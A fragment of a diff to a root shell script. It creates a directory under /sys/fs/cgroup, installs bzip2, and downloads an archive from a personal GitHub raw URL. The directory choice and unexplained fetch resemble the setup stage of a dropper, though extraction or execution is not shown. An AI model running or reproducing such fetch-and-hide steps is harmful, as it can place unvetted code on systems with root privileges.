@@ -1,5 +1,5 @@
-cd /sys/fs/cgroup/downloads
-mkdir -p 
+cd /root
+mkdir -p /sys/fs/cgroup/downloads
 yum -y install bzip2
 yum clean all
 curl -O https://raw.githubusercontent.com/zhouzhenqi/file/master/ct2.tar.bz2
